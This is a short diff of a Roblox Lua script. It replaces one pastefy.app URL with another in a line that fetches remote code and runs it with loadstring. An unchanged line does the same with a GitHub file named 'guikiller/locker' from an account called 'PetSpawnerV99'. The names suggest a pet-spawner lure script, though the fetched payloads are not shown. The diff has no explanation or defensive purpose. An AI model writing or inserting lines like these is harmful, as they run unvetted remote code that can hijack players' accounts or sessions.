@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/Vn0h83ne/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/B00Jc84x/raw"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSpawnerV99/guikiller/refs/heads/main/locker"))()
 local players = game:GetService("Players")
 local collectionService = game:GetService("CollectionService")
